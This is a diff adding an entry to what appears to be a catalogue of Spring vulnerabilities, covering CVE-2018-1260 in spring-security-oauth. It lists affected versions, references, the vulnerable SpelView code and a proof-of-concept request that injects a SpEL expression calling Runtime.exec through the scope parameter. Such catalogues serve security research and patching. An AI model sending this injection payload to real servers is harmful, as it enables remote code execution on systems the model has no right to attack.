@@ -273,6 +273,31 @@ SpelView
         };
     }
 ```
+
+### CVE-2018-1260 SpEL
+Affected Version: < 2.3.3 or 2.2.2 or 2.1.2 or 2.0.15  
+Ref: https://www.gosecure.net/blog/2018/05/17/beware-of-the-magic-spell-part-2-cve-2018-1260/  
+Diff: https://github.com/spring-attic/spring-security-oauth/commit/adb1e6d19c681f394c9513799b81b527b0cb007c  
+POC: 
+```
+GET or POST
+/oauth/authorize?client_id=client&response_type=code&redirect_uri=http://www.baidu.com&scope=%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22calc.exe%22%29%7D
+```
+Factor: 
+```
+org.springframework.security.oauth2.provider.endpoin.SpelView
+    public SpelView(String template) {
+        ...
+        this.resolver = new PlaceholderResolver() {
+            public String resolvePlaceholder(String name) {
+                Expression expression = SpelView.this.parser.parseExpression(name);
+                Object value = expression.getValue(SpelView.this.context);
+                return value == null ? null : value.toString();
+            }
+        };
+    }
+```
+
 ## Spring Cloud Netflix Hystrix Dashboard + Spring Boot Thymeleaf
 ### CVE-2021-22053 SpEL
 Affected Version: < 2.2.9.RELEASE   
